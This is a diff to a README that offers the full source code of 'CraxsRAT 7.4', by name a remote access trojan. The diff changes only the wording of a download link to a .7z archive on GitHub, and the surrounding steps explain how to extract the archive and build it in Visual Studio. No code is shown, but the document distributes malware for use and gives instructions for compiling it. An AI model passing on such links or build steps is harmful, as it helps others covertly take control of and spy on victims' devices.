@@ -6,7 +6,7 @@ The code is very easy to compile and use.
 
 ## How to Compile
 
-- [Download the project to your computer. (Click Here)](https://github.com/CRAX-00/CraxsRAT-7.4-FULL-Source-Code/releases/download/CraxsRAT-Source/CraxsRat-SRC-7.4.7z)
+- [Download the project from the **Releases** section or click here](https://github.com/CRAX-00/CraxsRAT-7.4-FULL-Source-Code/releases/download/CraxsRAT-Source/CraxsRat-SRC-7.4.7z)
 - Extract the ZIP file from the archive.
 - Open the solution file.
 - To compile the project, select **Build Solution** from the **Build** menu. (Location of compiled files: `./bin/Debug/`)
